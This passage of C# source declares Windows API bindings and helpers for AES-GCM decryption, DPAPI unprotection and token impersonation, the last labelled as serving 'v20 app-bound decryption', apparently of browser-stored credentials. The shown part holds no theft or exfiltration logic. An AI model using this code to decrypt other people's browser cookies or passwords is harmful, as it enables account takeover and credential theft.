        byte[] pbInput, uint cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey,
        IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[]? pbInput, uint cbInput,
        IntPtr pPaddingInfo, byte[]? pbIV, uint cbIV, byte[]? pbOutput, uint cbOutput,
        out uint pcbResult, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public uint cbSize;
        public uint dwInfoVersion;
        public IntPtr pbNonce;
        public uint cbNonce;
        public IntPtr pbAuthData;
        public uint cbAuthData;
        public IntPtr pbTag;
        public uint cbTag;
        public IntPtr pbMacContext;
        public uint cbMacContext;
        public uint cbAAD;
        public ulong cbData;
        public uint dwFlags;
    }

    private static byte[]? AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        int status = BCryptOpenAlgorithmProvider(out IntPtr hAlg, "AES", null, 0);
        if (status != 0) return null;
        try
        {
            byte[] gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlg, "ChainingMode", gcmMode, (uint)gcmMode.Length, 0);
            if (status != 0) return null;

            status = BCryptGenerateSymmetricKey(hAlg, out IntPtr hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
            if (status != 0) return null;
            try
            {
                var nonceHandle = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                var tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);
                try
                {
                    var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
                    {
                        cbSize = (uint)Marshal.SizeOf<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>(),
                        dwInfoVersion = 1,
                        pbNonce = nonceHandle.AddrOfPinnedObject(),
                        cbNonce = (uint)nonce.Length,
                        pbTag = tagHandle.AddrOfPinnedObject(),
                        cbTag = (uint)tag.Length,
                    };

                    var output = new byte[ciphertext.Length];
                    var authPtr = Marshal.AllocHGlobal(Marshal.SizeOf<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>());
                    Marshal.StructureToPtr(authInfo, authPtr, false);
                    try
                    {
                        status = BCryptDecrypt(hKey, ciphertext, (uint)ciphertext.Length,
                            authPtr, null, 0, output, (uint)output.Length, out _, 0);
                    }
                    finally { Marshal.FreeHGlobal(authPtr); }

                    return status == 0 ? output : null;
                }
                finally
                {
                    tagHandle.Free();
                    nonceHandle.Free();
                }
            }
            finally { BCryptDestroyKey(hKey); }
        }
        finally { BCryptCloseAlgorithmProvider(hAlg, 0); }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  DPAPI P/Invoke
    // ════════════════════════════════════════════════════════════════════════

    [StructLayout(LayoutKind.Sequential)]
    private struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LocalFree(IntPtr hMem);

    // ════════════════════════════════════════════════════════════════════════
    //  Token Impersonation P/Invoke (for v20 app-bound decryption)
    // ════════════════════════════════════════════════════════════════════════

    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
    private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    private enum SECURITY_IMPERSONATION_LEVEL { SecurityImpersonation = 2 }
    private enum TOKEN_TYPE { TokenPrimary = 1 }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    private static byte[]? ProtectedData_Unprotect(byte[] encData)
    {
        var inputBlob = new DATA_BLOB { cbData = encData.Length, pbData = Marshal.AllocHGlobal(encData.Length) };
        Marshal.Copy(encData, 0, inputBlob.pbData, encData.Length);

        try
        {
            if (CryptUnprotectData(ref inputBlob, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out var outputBlob))
            {
                var result = new byte[outputBlob.cbData];
                Marshal.Copy(outputBlob.pbData, result, 0, outputBlob.cbData);
                LocalFree(outputBlob.pbData);
                return result;
            }
            return null;
        }
        finally { Marshal.FreeHGlobal(inputBlob.pbData); }
    }
}
